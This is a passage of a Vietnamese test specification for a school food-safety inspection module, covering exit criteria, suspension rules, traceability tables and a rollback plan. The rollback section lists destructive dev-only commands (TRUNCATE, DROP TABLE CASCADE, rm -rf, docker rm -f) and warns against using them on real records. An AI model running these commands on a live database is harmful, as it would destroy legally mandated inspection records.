- [ ] Flyway **V1** (schema chung, Nam) đã chạy — gồm `schools`, `partners`, `students`, `menus`, `inventory_batches`
- [ ] `common/enums/MealType` + `RoleKey` (D6) đã có ở module `common` (Nam sở hữu)
- [ ] Logic Issues §2 đã xác nhận: **Nam** cho L1–L4 (đã Approved) + L10/CF-6 (ranh giới MF07↔MF11) + CF-9 (checklist thuộc MF12) · **Huy** cho L5/L6/L7/L20 + ranh giới HSD `TC-006` + nội dung MSG-088 (`TC-018`) · **Mạnh** cho L8/L11 + CHECK constraint · **Minh** cho L12/L13/L14/L15/L16/L17/L18/L19/L21/L22
- [ ] Fixtures `FX-001`…`FX-030` đã tạo trong `InspectionTestFixtures.java` + `src/test/resources/fixtures/`
- [ ] Testcontainers chạy được trên dev + CI (Docker daemon)
- [ ] `ObjectStoragePort`, `GeoLocationPort`, `CorrectiveActionPort` đã có **interface** (implementation có thể chưa xong)
- [ ] Mẫu `00_Policies/specialreport2173_1.md` có sẵn để làm oracle cấu trúc PDF (`TC-017`)

### Exit Criteria (Definition of Done)

**Bắt buộc:**

- [ ] `mvn test` — unit xanh; `@Disabled` **chỉ** gồm `TC-005` (CF-24/L19) — kèm lý do trong annotation
- [ ] `mvn verify` — integration xanh (Failsafe + Testcontainers)
- [ ] Coverage: **≥ 90% line** cho `com.sfms.mf07.service`; **100% branch** cho `ThreeStepValidator`, `ServingApprovalService`, `Step2Validator`, `Step3Validator`, `ViolationRecordService` (gate BR-211)
- [ ] **Mỗi condition §3 TDS-03 có ≥ 1 TC xanh** — **42/42**
- [ ] **Mỗi hàng §13 của TDS được cover:** `UT-07-01…20` → 20/20 · `IT-07-01…13` → 13/13 · `SEC-07-01…08` → 8/8 · `E2E-07-01…02` → 2/2
- [ ] **Mỗi constraint C1–C14 có ≥ 1 TC:**

| Constraint | TC cover |
|---|---|
| C1 (3 bước + đồng ký) | TC-001, TC-002, TC-010, TC-INT-001 |
| C2 (ngưỡng nhiệt độ `>=`, 2 tầng) | TC-003, TC-004, TC-005, TC-006, TC-INT-012 |
| C3 (CAPA + tái kiểm phiên mới) | TC-008, TC-009, TC-INT-008, TC-INT-014 |
| C4 (`serving-gate` chốt duy nhất) | TC-014, TC-027, TC-INT-002, TC-INT-003, TC-SEC-015, TC-E2E-001 |
| C5 (ảnh + lý do + GPS server-side) | TC-007, TC-015, TC-INT-012 |
| C6 (điểm bếp <60 = cảnh báo) | TC-012, TC-013, TC-014, TC-INT-009 |
| ~~C7~~ (biên bản nhắm đơn vị + BR-211) | ⛔ **chuyển MF11** (`M07-D07`) — TC-017, TC-019, TC-020, TC-INT-011 `@Disabled`, **không** tính vào Exit Criteria của MF07 |
| C8 (row-level BR-099) | TC-SEC-005, TC-SEC-006, TC-INT-004 |
| C9 (`PUT` partial merge) | TC-028, TC-INT-006 |
| C10 (phân quyền theo FIELD) | TC-022, TC-023, TC-SEC-008, TC-SEC-009 |
| C11 (không tin số client) | TC-011, TC-018, TC-INT-009 |
| C12 (tên field JSON) | TC-E2E-003 · *(phần định dạng đã bị D4/D6 ghi đè → TC-024, TC-025)* |
| C13 (CAPA/gate server-side) | TC-008, TC-INT-008 · *(TC-020/TC-SEC-014 chuyển MF11)* |
| C14 (checklist xoá = ẩn) | TC-016, TC-INT-010 |
| **C15** (D12 — field dẫn xuất + sai kiểu) 🆕 | **TC-029**, TC-011 |
| **C16** (D11 — một DTO, không `oneOf`) 🆕 | **TC-SEC-017** |
| **C17** (D10-BIS — bằng chứng riêng tư) 🆕 | TC-SEC-010, `TC-SEC-018` *(chờ viết cùng đợt upload)* |

- [ ] **Mỗi quyết định D1–D13 có ≥ 1 TC:** D1 → `TC-INT-016` · D2 → mọi TC error path (`$.error.code`) · D3 → `TC-E2E-003` · D4 → `TC-024`, `TC-029` bước 7 · D5 → `TC-026` · D6 → `TC-025`, `TC-029` bước 8 · D7 → assert `message` tiếng Anh nguyên văn ở `TC-003`, `TC-SEC-001`; **từ 03/08 áp được cho CẢ 15 mã `INSP-*`** vì MSG-145…148 đã cấp, không còn TC nào assert `error.code` suông · **D9** → `TC-INT-021` (assert `created_by` tự điền, service không gán tay) · **D10-BIS** → `TC-SEC-010`/`TC-SEC-018` · **D11** → **`TC-SEC-017`** · **D12** → **`TC-029`** · **D13** → mọi TC bảo mật dùng tài khoản seed thật, **không** `@WithMockUser`
- [ ] **Kiểm D11/D12 đã có TC thật, không phải checklist:**
  ```bash
  grep -n "MF07-TC-SEC-017\|MF07-TC-029" TestSpec-MF07_Food_Safety_Inspection.md   # >= 6 dòng
  grep -n "PagedResponseInspectionSummaryResponse" TestSpec-MF07_Food_Safety_Inspection.md  # >= 1
  ```
  *(`TestSpec-MF04` có 1 dòng checklist ở Exit Criteria cho D11 — **checklist không phải test**, không ai chạy được nó. Hai lệnh trên phân biệt hai thứ đó.)*
- [ ] **Oracle Source** — mọi TC có dòng `Oracle Source`:
  ```bash
  grep -c "^\*\*Oracle Source:\*\*" TestSpec-MF07_Food_Safety_Inspection.md   # >= 60
  ```
- [ ] **Không mã bịa:** mọi UC/BR/MSG tồn tại đúng nguồn (§9 phụ lục — Huy xác nhận)
- [ ] **Contract Existence:** `mvn -q test-compile` → BUILD SUCCESS
- [ ] **Fixture Isolation:** grep static entity → no output (§4)
- [ ] **Không cú pháp sai stack:**
  ```bash
  grep -rnE "export interface|prisma\.|npx prisma|model [A-Z][A-Za-z]* \{" \
       TestSpec-MF07_Food_Safety_Inspection.md src/test/java/com/sfms/mf07/
  # Expected: no output
  ```
- [ ] **Không còn `@JsonFormat`** (D4): `grep -rn "@JsonFormat" src/main/java/com/sfms/mf07/` → no output
- [ ] **Không khai lại enum D6:** `grep -rn "enum MealType" src/main/java/com/sfms/mf07/` → no output
- [ ] **PDPD:** log không lộ định danh (`TC-SEC-011`):
  ```bash
  grep -rniE "staffName|staffPosition|caterersRepresentativeId" target/*.log   # Expected: no output
  ```
- [ ] **4 truy vấn nhất quán `overall` (`TC-INT-019`) trả 0 dòng** — *bắt buộc chạy trước mỗi release theo cam kết ADR-M07-02*
- [ ] **Truy vấn `PHAT_SUAT_DU_KIEM_THUC_TRUOT` (`TC-027`) trả 0 dòng** trên DB sau test
- [ ] **Truy vấn checksum ảnh ký (`TC-SEC-012`) trả 0 dòng**
- [ ] **Red Gate (§5.4)** — tất cả FAIL với stub; **7 bẫy MF07** đã kiểm thủ công (ký tên)
- [ ] `semantic-audit.ts` chạy trên dữ liệu backend: **0 vi phạm** luật §7
- [ ] Swagger đối chiếu §9.2: **29 endpoint** khớp path/method (Minh xác nhận)
- [ ] Smoke test §11.3 bước 6 xanh: `serving-gate` trả `{"allowed":false,"reasonCode":"NO_SESSION"}` khi chưa có phiên

**Nghiệm thu chéo theo RACI (`00_` §1):**

- [ ] **Nam** (Architecture + Final Approve): xác nhận **L1–L4** đã phản ánh đúng D1–D7; chốt **ranh giới MF07↔MF11** (L10/CF-6) và **checklist thuộc MF12** (CF-9) để 2 module không gen trùng entity; chốt 405 vs 403 cho `DELETE /inspections` (`TC-SEC-013`)
- [ ] **Huy** (Traceability): §2 + §9 phụ lục không mã bịa; chốt chênh **11 vs 13 UC** (L5); chốt ranh giới HSD "đúng ngày" (`TC-006`); cập nhật **nội dung MSG-088** đã lỗi thời (`TC-018`); quyết định 6 field CF-10 và 4 cột `fail_*` (L20); bổ sung **MSG-093** vào traceability (L6)
- [ ] **Mạnh** (Backend/DB): DB assertion dùng đúng bảng/cột §5.2 sau khi cập nhật D1; CHECK constraint trong `V12`; **`ck_insp_holding_temp` chưa enable** (`TC-INT-013`); cập nhật `data_model.puml` (L8 `FridgeTempLog`, CF-8 `meal`, CF-31 `reject_reason`, CF-32 `hygieneScore`/`failedSteps`)
- [ ] **Minh** (FE↔BE): `TC-E2E-003` xanh với snapshot khoá từ mock hiện tại; **gỡ lọc client-side ở màn phát suất** (L17 — chặn `TC-E2E-001`); **gỡ lệnh gọi CAPA ở client** (L12); bổ sung ô nhập `holdingTemp` (L19), nút đồng ký (L15), nút tái kiểm (L16), pre-fill `sourceInspectionId` (CF-29), hộp thoại xác nhận xoá checklist (L13)
- [ ] **Thảo** (chủ module + Lead QA): tự review, ký `Author`

### Suspension Criteria (điều kiện tạm dừng)

| # | Điều kiện | Hành động |
|---|---|---|
| S1 | MF01/MF02 chưa xong | Dừng TC-SEC-* và TC-INT-*; vẫn viết được unit TC-001…028 với Mockito |
| S2 | `common/enums/MealType` chưa có (D6) | `TC-025` blocked; **không** tự khai enum trong MF07 để "chạy tạm" — sẽ thành 2 bộ giá trị |
| S3 | **MF09 chưa có** | `TC-SEC-015` (static check) và nhánh phát suất của `TC-E2E-001` **blocked**, không PASS giả (bẫy #7 §5.4) |
| S4 | **MF11 chưa có** bảng `corrective_actions` | `TC-INT-008` blocked ở phần assert DB; vẫn test được phần **phát event** ở `TC-008` |
| S5 | CF-24 (`holdingTemp`) chưa có ô nhập | `TC-005` giữ `@Disabled`; `TC-INT-013` **phải xanh** (constraint chưa enable) |
| S6 | L20 (`fail_severity`/`fail_witness`) chưa được Huy chốt | Tách phần assert 4 cột `fail_*` khỏi `TC-007` sang TC riêng `@Disabled`; giữ phần ảnh + lý do |
| S7 | L10/CF-6 (ranh giới MF07↔MF11) chưa được Nam chốt | `TC-SEC-009` chỉ assert **MF07 không mở cửa** cho Medical Staff ghi `resolution`; **không** test phân nhánh BR-186 |
| S8 | Docker/Testcontainers không chạy trên CI | Dừng tầng integration; báo Nam. **KHÔNG** đổi sang H2 — mất `ILIKE`, mất CHECK constraint, mất `uuid` → test vô nghĩa |
| S9 | TDS-MF07 **chưa** cập nhật theo D1–D7 | **Vẫn viết test theo D1–D7** (ưu tiên cao hơn) nhưng ghi rõ vào biên bản review; **không** sửa TestSpec để khớp TDS cũ |
| S10 | Phát hiện lệch nguồn mới | Thêm hàng vào §2 Logic Issues, báo chủ nguồn; **không** tự chọn bên đúng |

---

## 7. Rollback Plan

> ⚠️ **KHÔNG dùng `npx prisma migrate reset`** như template gốc — dự án dùng **Flyway**, Community **không** auto-undo.
> ⚠️⚠️ **MF07 có ràng buộc pháp lý riêng:** hồ sơ kiểm thực là **hồ sơ bắt buộc theo QĐ 1246** và biên bản vi phạm là **văn bản có ký tay 2 bên**. Rollback ở đây khác các module khác.

```bash
# ── DEV / TEST ONLY ────────────────────────────────────────────────
# 1) Xoá dữ liệu test MF07 (không chạm schema)
psql "$SFMS_DB_URL" -c "TRUNCATE checklist_item_results, checklist_items, checklist_groups,
    step1_fresh_rows, step1_dry_rows, step2_rows, step3_rows,
    inspection_evidences, safety_signoffs,
    kitchen_inspections, inspection_sessions CASCADE;"

# 2) Hạ schema MF07 — migration BÙ, không undo
#    src/main/resources/db/migration/V14__mf07_rollback.sql
#      DROP TABLE IF EXISTS checklist_item_results, checklist_items, checklist_groups,
#           step1_fresh_rows, step1_dry_rows, step2_rows, step3_rows,
#           inspection_evidences, safety_signoffs,
#           kitchen_inspections, inspection_sessions CASCADE;
mvn flyway:migrate

# 3) Dọn file upload test (ảnh bằng chứng + PDF)
rm -rf ./target/test-uploads/*

# 4) Testcontainers: container bị huỷ sau mỗi lần chạy (chỉ xoá khi .withReuse(true))
docker rm -f $(docker ps -aq --filter "label=org.testcontainers=true") 2>/dev/null || true

# 5) Revert code test
git checkout -- src/test/java/com/sfms/mf07/ src/test/resources/fixtures/

# 6) Gỡ Red Phase stub trước khi merge
git rm src/main/java/com/sfms/mf07/service/impl/*RedStub.java
```

**Quy tắc rollback — MF07 nghiêm ngặt hơn các module khác:**

| # | Quy tắc | Lý do |
|---|---|---|
| **R1** | ⛔ **TUYỆT ĐỐI KHÔNG chạy bước 1 hoặc 2 trên môi trường có dữ liệu kiểm thực thật.** Chỉ khôi phục backup và **giữ nguyên** bản ghi. | `TDS` §12.2 nguyên văn: *"⚠️ NẾU ĐÃ CÓ DỮ LIỆU KIỂM THỰC THẬT: **KHÔNG drop** — đó là hồ sơ pháp lý (QĐ 1246)"*. Xoá hồ sơ kiểm thực = tiêu huỷ hồ sơ bắt buộc theo Luật ATTP. |
| **R2** | Rollback **phải giữ traffic đọc**: dừng traffic **ghi**, không dừng đọc. | `TDS` §12.2 bước 1: *"giữ traffic đọc để **thanh tra vẫn tra cứu được**"* |
| **R3** | Ảnh bằng chứng + ảnh biên bản đã ký ở object storage: **không** xoá cùng DB rollback | Ảnh là bằng chứng độc lập; xoá DB rồi restore backup mà ảnh đã mất ⇒ hồ sơ khuyết vĩnh viễn. Dọn file **chỉ** ở `./target/test-uploads`. |
| **R4** | Số hiệu migration MF07 là **`V12`/`V13`**, rollback `V14` (`M07-D06` — `V11` đã bị `V11__seed_mf06.sql` lấy; **chạy lại `ls db/migration/` trước khi viết**) (TDS §11.3/§12.2) — nếu đụng module khác, **hỏi Nam** | `00_` §4b: migration là tài nguyên chung có thứ tự |
| **R5** | Flyway `V1` (schema chung) **do Nam sở hữu** — không rollback một phía | như trên |
| **R6** | Smoke test **bắt buộc sau rollback**: `serving-gate` phải trả `allowed=false` khi không có phiên | `TDS` §12.2 bước 5. Nếu sau rollback gate trả `true` mặc định ⇒ **mở cửa phát suất không kiểm thực** — nguy hiểm hơn cả sự cố ban đầu. |
| **R7** | Rollback test **không** kéo theo rollback TDS | TDS là tài liệu nộp report |

---

## 8. CASE 2.0 Anti-Pattern Detection

| AP-ID | Anti-Pattern | Dấu hiệu | Check | Gate chặn |
|-------|-------------|----------|-------|-----------|
| AP-AI-001 | **Unconstrained Generation** | TC không reference constraint/BR/điều luật nào | ☐ | G-0 — mọi TC có `Oracle Source` + `Constraint Ref` (grep gate §6) |
| AP-AI-002 | **Green-from-Birth** | Test PASS với stub ném exception (§5.4) | ☐ | **G-2 ★** — Red Gate + **7 bẫy MF07** |
| AP-AI-003 | **Implicit Decision** | Test assume quyết định kiến trúc không có ADR | ☐ | G-1 — mọi giả định trỏ `ADR-M07-01…05`, `ADR-000`, hoặc **D1–D7** |
| AP-AI-004 | **Layer Violation** | Test verify controller có business logic | ☐ | G-4 — §3 TDS-01 phân tầng: BR test ở `service/`, controller chỉ authz/shape |
| AP-AI-005 | **Hallucinated Contract** | Test import service/type không tồn tại | ☐ | G-3 — `mvn test-compile` |
| **AP-AI-010** | **Bypass Gate** *(riêng MF07)* | Test/code đi đường vòng quanh `serving-gate`; MF09 query trực tiếp bảng MF07 | ☐ | **G-5 ★** — `TC-SEC-015` static check + `TC-027` truy vấn nhất quán |

**Rủi ro riêng của MF07 — reviewer kiểm thêm:**

| # | Rủi ro | Dấu hiệu | Cách kiểm |
|---|---|---|---|
| M1 | **Bịa mã BR/MSG** — MF07 dễ vì có nhiều BR deprecated (BR-089, BR-184) và nhiều MSG chưa vào traceability (MSG-093, MSG-094) | Dùng BR-089 làm oracle cho giám sát tự động · dùng BR-184 cho biên bản cá nhân · gán MSG-093 vào cột BR của UC-014 | Đối chiếu §9 phụ lục với `traceability_matrix.md` §1.7 — **Huy** |
| M2 | **Tự cấp MSG mới** — 8 error code **không** có MSG tương ứng (`INSP-079/083/091/092/094/098`, `VIO-211`) | TC assert một chuỗi MSG không tồn tại trong `error_message.md` | `grep` từng MSG ID; error code kỹ thuật thì OK, **MSG mới thì không** |
| M3 | **Vượt ranh giới module** | TC test logic CAPA (MF11), phân nhánh BR-186 (MF11), CRUD checklist (MF12), hoặc phát suất (MF09) | §3 TDS-01 bảng "NGOÀI phạm vi"; L10/CF-6 và CF-9 |
| M4 | **Tự chọn bên đúng cho CF** | TC khoá cứng một bên của CF-24/L20/CF-10 mà không `@Disabled` + ghi chú | Policy cuối §2.3. **Ngoại lệ hợp lệ:** L1–L4 (D1–D7 đã Approved) |
| M5 | **Khôi phục hành vi đã descope** | Xuất hiện MSG-024, cột quarantine bếp, bảng `fridge_temp_logs`/`pest_control_logs`, job `@Scheduled` nhiệt độ | `TC-INT-009`, `TC-INT-015`, `TC-021` |
| M6 | **Cú pháp sai stack** | `export interface`, `prisma.`, `makeEntity()`, `npm test`, `npx prisma` | grep gate §6 |
| M7 | **Bỏ sót D1–D7** *(mới)* | Còn `@JsonFormat`, còn `dd/MM/yyyy` trong assert, `meal` tiếng Việt, PK `VARCHAR`, assert lỗi ở `$.message` thay vì `$.error.code`, khai lại enum trong module | grep gate §6 + `TC-024`, `TC-025`, `TC-INT-016`, `TC-E2E-003` |
| M8 | **Test gate an toàn xanh giả** *(nghiêm trọng nhất)* | `TC-INT-003`/`TC-014` chỉ assert `allowed == false` mà không assert `reasonCode`, và không có ca `true` đối chứng | Bẫy #1 §5.4 — **kiểm thủ công, ký tên** |

**Kết quả review:**

- [ ] Không phát hiện anti-pattern nào → TDD spec **approved**
- [ ] Phát hiện AP → ghi vào bảng dưới → fix trước khi implement

| AP detected | TC ID | Mô tả | Fix action | Fixed? |
|------------|-------|-------|------------|--------|
| `AP-AI-___` | `MF07-TC-___` | | | ☐ |

---

## 9. Phụ lục — Danh sách mã UC/BR/MSG đã trích dẫn

> Bảng đối chiếu cho **Huy (Lead Traceability)**. Mọi mã phải tồn tại đúng nguồn; **không có mã nào do AI đặt ra**.

### 9.1. Use Case (11 — đúng `traceability_matrix.md` §1.7)

| UC ID | Tên UC (nguyên văn §1.7) | Actor | TC cover |
|---|---|---|---|
| UC-052 | Manage Three-Step Food Inspection | Service Caterers | TC-001…010, TC-INT-001, TC-E2E-001 |
| UC-065 | Record Meals Before Serving | Service Caterers | TC-005, TC-010, TC-INT-002, TC-INT-003 |
| UC-014 | Conduct Food Safety Inspection | Medical Staff | TC-011…015, TC-023, TC-SEC-003, TC-SEC-004, TC-INT-009, TC-INT-010 |
| UC-027 | Daily Food Safety Monitoring | School Administration | TC-INT-017, TC-INT-018 |
| UC-054 | Monitor Food Safety | Medical Staff | TC-021 |
| UC-112 | View Food Inspection Records | Medical Staff | TC-INT-004, TC-SEC-005 |
| UC-113 | View Food Inspection Reports | School Administration | TC-INT-017 |
| UC-115 | View Food Safety Compliance Report | Medical Staff | TC-INT-017 |
| UC-117 | View Food Safety Reports | Medical Staff | TC-INT-017 |
| UC-124 | View Inspection Records | Service Caterers | TC-INT-004, TC-SEC-005 |
| UC-178 | ~~Record Process Violation~~ *(Deprecated 11/07/2026)* | Service Caterers, Medical Staff | TC-016b*, TC-017…020, TC-INT-011, TC-E2E-002 — ⚠️ **màn nhập gộp về UC-179 (MF11)**, xem L10 |

> ✅ **L5/CF-1 — ĐÓNG 2026-08-03 (Huy).** Chênh **11 vs 13** không phải lỗi: 2 UC dôi ra là **UC-185 + UC-186**, đúng như `traceability_matrix.md` **dòng 630** ghi tên trong nhóm *"Food Safety Inspection & Monitoring (gồm Violation, +UC-178, +UC-185, +UC-186)"*. **UC-062 thuộc MF06** (changelog matrix v1.1: *"gộp UC-062/UC-063 về Section 1.5"*) ⇒ **không** TC nào gán UC-062; nội dung Bước 1 của nó vẫn dùng làm **nguồn nghiệp vụ** cho `Step1Fresh/Step1Dry` (`TC-006`, `TC-007`), ghi rõ nguồn là UC file. §9.1 giữ **11 dòng** theo §1.7.
> *`TC-016b` = phần assert `VIO-085` trong `MF07-TC-019` (thiếu mô tả/ảnh → 422).

### 9.2. Business Rules

**Trong cột BR của §1.7 (oracle chính thức):**

| BR | Nội dung (tóm, nguyên văn `business_rules.md`) | § | TC cover |
|---|---|---|---|
| BR-079 | Đúng **3 bước** theo Điều 3–5 QĐ 1246 | §8 | TC-001, TC-002, TC-INT-001 |
| BR-083 | Mỗi bước kèm **ảnh bằng chứng, GPS, timestamp** tự động | §8 | TC-007, TC-015, TC-SEC-010, TC-INT-006, TC-INT-012 |
| BR-090 | Nhiệt độ lõi **≥ 75°C** (Bước 2) | §8 | TC-003, TC-004, TC-INT-012 |
| BR-091 | Giữ ấm **≥ 60°C** (Bước 3) | §8 | TC-005 ⚠️ disabled (L19 — chờ Minh, **không** phải chờ MSG: `MSG-145` đã cấp 03/08), TC-INT-013 |
| BR-092 | **Tự động** kiểm hạn sử dụng lô nguyên liệu | §8 | TC-006 |
| BR-093 | Mỗi phiên tạo **hồ sơ hoàn chỉnh** liên kết lô + hồ sơ sản xuất | §8 | TC-INT-001 |
| BR-094 | Bữa ăn **không được phục vụ** nếu bất kỳ bước nào thất bại | §8 | TC-014, TC-027, TC-INT-002, TC-INT-003, TC-SEC-015, TC-E2E-001 |
| BR-095 | Bước thất bại → chi tiết không tuân thủ + **tự động tạo CAPA** | §8 | TC-007, TC-008, TC-INT-008, TC-E2E-002 |
| BR-096 | Sau khắc phục phải **tái kiểm tra** | §8 | TC-009, TC-INT-014 |
| BR-097 | Thất bại **nghiêm trọng** liên kết tự động với quản lý sự cố | §8 | TC-008 (ca `severity=HIGH`) |
| BR-098 | Chỉ **cả 3 bước ĐẠT** mới phê duyệt bữa ăn | §8 | TC-001, TC-010, TC-INT-003, TC-INT-019 |
| BR-099 | Medical/SchoolAdmin xem **toàn bộ**; Caterer chỉ **hồ sơ của mình** | §8 | TC-SEC-005, TC-SEC-008, TC-INT-004 |
| BR-100 | Điểm số vệ sinh **hàng ngày** của bếp | §12 | TC-011, TC-INT-009 |
| BR-101 | Lưu kết quả kiểm tra **định kỳ hàng tháng** | §12 | TC-INT-010 (dữ liệu lịch sử còn nguyên) |
| BR-102 | **(sửa 27/07/2026)** Côn trùng = **mục tùy chọn** trong phiên, không hồ sơ riêng | §12 | TC-INT-015 (không bảng riêng), L9 |
| BR-103 | Theo dõi **giấy xác nhận sức khỏe** nhân viên bếp | §12 | TC-INT-009 (`staff_health_valid`) |
| BR-104 | Điểm vệ sinh vào **Báo cáo Tuân thủ ATTP** | §12 | TC-011, TC-INT-017 |
| BR-089 | ~~Giám sát nhiệt độ tủ lạnh liên tục~~ **Deprecated 11/07/2026** | §12 | TC-021, TC-INT-015 — **không** implement giám sát tự động (L7) |
| BR-183 | **1 loại** Biên bản Vi phạm, nhắm **đơn vị Nhà thầu** | §18 | TC-019, TC-SEC-011, TC-INT-020, TC-E2E-002 |
| BR-211 | Export PDF → in → **ký tay 2 bên** → upload ảnh ký; thiếu ảnh ký = **gate chặn cứng** | §18 | TC-017, TC-020, TC-SEC-012, TC-SEC-014, TC-INT-011 |

**Nhắc tới nhưng KHÔNG dùng làm oracle chính thức (ngoài §1.7 — chờ Huy):**

| BR | Vì sao nhắc | Xử lý |
|---|---|---|
| BR-184 | mock còn `type:"Nhân sự"`, `staffName`… | **Deprecated 26/07/2026** (L11) — oracle của `TC-019` là **BR-183**, không phải BR-184 |
| BR-185 | `unit_sanction_level` thay `disciplinaryLevel` | Nhắc trong `TC-019`; oracle chính là BR-183 |
| BR-186 | phân nhánh người duyệt LOW vs MEDIUM/HIGH | **Thuộc MF11 UC-180/182** (L10) — `TC-SEC-009` chỉ chặn Medical tự duyệt, **không** test phân nhánh |
| BR-187 | dò tái diễn 90 ngày | Oracle của `TC-018`; ⚠️ **nội dung MSG-088 lỗi thời** so với bản sửa 26/07 |
| BR-188 | biên bản append-only | Oracle phụ của `TC-INT-011`, `TC-INT-018`; **không** trong §1.7 |
| BR-189 / BR-190 | registry vi phạm / lạm dụng override | Xuất hiện ở §9.2 endpoint #14/#18; **không** có TC riêng ở TestSpec này (thuộc MF11) |
| BR-007 | RBAC 7 role | Nền của §16; oracle của TC-SEC-* là **§16** |
| BR-170 | audit actor + IP | **oracle của `TC-INT-018` là TDS §14.2/§4.3** — ghi rõ để Huy đối chiếu |
| BR-207 / BR-210 | checklist động | **Thuộc MF12/UC-186** (CF-9) — oracle của `TC-015`/`TC-016` là MSG-016/MSG-094 + CHECK constraint |
| BR-105 | lưu mẫu sau 3 bước ĐẠT | Thuộc **MF08**; nhắc ở §1 Downstream, **không** TC |

### 9.3. System Messages (15 — đều tồn tại trong `error_message.md`)

| MSG ID | Nội dung nguyên văn | TC cover |
|---|---|---|
| MSG-004 | `Session expired. Please log in again.` | TC-SEC-001 |
| MSG-005 | `Access denied: You do not have permission to access this resource.` | TC-SEC-002…011 |
| MSG-015 | `Receiving action blocked: GPS location verification failed (out of tolerance).` | TC-007 *(dev: no-op theo ADR-000 — `FX-026`)* |
| MSG-016 | `Checklist validation failed: Mandatory safety checks are missing.` | TC-015 |
| MSG-017 | `Cooking temperature too low: Meal core temperature must reach 75°C.` | TC-003, TC-004 |
| MSG-043 | `Food safety inspection checklist submitted successfully.` | TC-001, TC-INT-001 |
| MSG-055 | `High temperature alert in inventory storage area: [Temperature]°C.` | TC-021 — ⚠️ chỉ khi **nhập tay** (L7) |
| MSG-056 | `Re-inspection required: Failed safety check during inspection step [Step Name].` | TC-008, TC-009, TC-INT-014 |
| MSG-059 | `Retention refrigerator door left open or temperature fluctuation detected.` | TC-021 — ⚠️ như MSG-055 |
| MSG-085 | `Violation record submission blocked: required fields (description, evidence photo) are missing.` | TC-019 |
| MSG-086 | `Violation record saved successfully.` | TC-019, TC-INT-011, TC-E2E-002 |
| MSG-088 | `Possible repeat violation detected: staff name matches a prior violation within the lookback window. Manual verification required.` | TC-018 — ⚠️ **nội dung lỗi thời** (BR-187 26/07 đổi sang `caterersRepresentativeId`); TC assert **mã**, không assert chuỗi "staff name" |
| MSG-093 | `Kitchen safety score below 60% threshold. Alert sent to School Administration — kitchen operations continue as normal.` | TC-012, TC-INT-009 — ⚠️ **không có trong §1.7** (L6) |
| MSG-094 | `This checklist item/group has been used in saved inspection records. Deleting it will not remove historical data — it will only be hidden from new inspections. Continue?` | TC-016, TC-INT-010 — ⚠️ thuộc nhóm **MF12** (CF-9) |
| MSG-095 | `Cannot close/submit this violation resolution: the signed 3-party record photo has not been uploaded yet. Please print, collect signatures, and upload the signed record first.` | TC-020, TC-SEC-014, TC-INT-011 |

> **MSG-024 KHÔNG được dùng ở MF07** — thuộc cơ chế khóa bếp **đã descope 05/07/2026** (L6/CF-2). Nếu thấy MSG-024 xuất hiện trong code MF07 → anti-pattern M5.

### 9.4. Error code kỹ thuật (TDS §10 — KHÔNG phải mã MSG mới)

**Trong phạm vi MF07 (15 mã — mọi mã nay ĐỀU có MSG, cập nhật 2026-08-03):**

`INSP-001` (400, MSG-138) · `INSP-004` (401, MSG-004) · `INSP-005` (403, MSG-005) · `INSP-015` (422, MSG-015) · `INSP-016` (422, MSG-016) · `INSP-017` (422, MSG-017) · `INSP-056` (200/warn, MSG-056) · `INSP-059` (200/warn, MSG-059) · **`INSP-079`** (409, **MSG-147** 🆕) · **`INSP-083`** (422, **MSG-148** 🆕) · **`INSP-091`** (422, **MSG-145** 🆕) · **`INSP-092`** (422, **MSG-146** 🆕) · `INSP-093` (200/warn, MSG-093) · **`INSP-094`** (409, **MSG-129** ✅ *đã tồn tại từ v1.5*) · **`INSP-098`** (409, **MSG-129**) · `INSP-404` (404, MSG-137) · `INSP-409` (409, MSG-139, D5) · `INSP-429` (429, MSG-141)

> ✅ **ĐÓNG 2026-08-03 — Huy cấp `MSG-145`…`MSG-148` (`error_message.md` v1.10).** Mọi TC error path nay assert được **chuỗi tiếng Anh nguyên văn** theo **D7**, không còn TC nào chỉ assert `error.code` suông. Đường đi: **7 mã thiếu MSG → 4** (grep ra MSG-129 đã có sẵn cho `INSP-094`/`INSP-098`, và bổ sung `INSP-404`/`INSP-001`/`INSP-429` dùng chung) **→ 0**.
>
> ⚠️ **Hai lần suýt mượn nhầm MSG của MF08** — cùng khuôn lỗi đã gây MSG-128 (v1.5) và MSG-142 (v1.9): **MSG-020** (*"Retention refrigerator temperature is out of safe range (2-8°C)"*, BR-110/tủ lưu mẫu) suýt bị mượn cho nhiệt độ **giữ ấm 60°C** của BR-091; **MSG-120** (*"...for food sample retention"*, BR-107) suýt bị mượn cho **ảnh bằng chứng kiểm thực** của BR-083. Cả hai **ghi cứng ngữ cảnh trong chuỗi tiếng Anh** nên mượn là sai hiển thị với người dùng thật. Nếu module của bạn định mượn MSG của module khác: **đọc nguyên văn chuỗi trước**, không chỉ nhìn mã.

**Chuyển sang MF11** (`M07-D07`): `VIO-085` (422, MSG-085) · `VIO-088` (200/warn, MSG-088 — ⚠️ nội dung lỗi thời so với BR-187) · `VIO-095` (409, MSG-095) · `VIO-211` (409, **chưa có MSG** — MF11 xin cấp).

### 9.5. Căn cứ pháp lý & luật semantic-audit

| Nguồn | Nội dung dùng làm oracle | TC cover |
|---|---|---|
| **QĐ 1246/QĐ-BYT** Điều 3–5 | 3 mẫu biểu (Mẫu 1 nguyên liệu / Mẫu 2 chế biến / Mẫu 3 trước khi ăn); đồng ký sau khi hoàn tất | TC-001, TC-002, TC-010, TC-INT-001, TC-SEC-013 |
| **Luật ATTP 55/2010/QH12** | Hồ sơ kiểm thực là hồ sơ bắt buộc lưu → **cấm xoá** | TC-SEC-013, §7 R1 |
| **PDPD (Luật 91/2025)** | Ảnh bằng chứng + định danh đại diện Nhà thầu | TC-SEC-010, TC-SEC-011, TC-019 |
| `00_Policies/specialreport2173_1.md` | Mẫu biên bản vi phạm (cấu trúc PDF) | ⛔ TC-017, TC-E2E-002 — **chuyển MF11** (`M07-D07`) |
| `semantic-audit.ts` §7 **`PHAT_SUAT_DU_KIEM_THUC_TRUOT`** | Phiên `overall` khớp `/KHÔNG ĐẠT\|FAIL/i` mà cùng ngày có `status="SERVED"` ⇒ vi phạm | **TC-027**, TC-E2E-001 |

### 9.6. `00_Common_Conventions.md` D1–D13

| Quyết định | Nội dung áp dụng | TC cover | Ghi đè gì của TDS-MF07 |
|---|---|---|---|
| **D1** | JSON `id` = `code`; PK UUID; path `{code}`; FK trong JSON dùng `code` | `TC-INT-016` + mọi DB assertion (`WHERE code`) | §5.2 PK `VARCHAR` → **L1** |
| **D2** | Envelope `{"error":{"code","message","details"}}` | mọi TC error path (`$.error.code`) | §10 (chưa khai envelope) → **L2** |
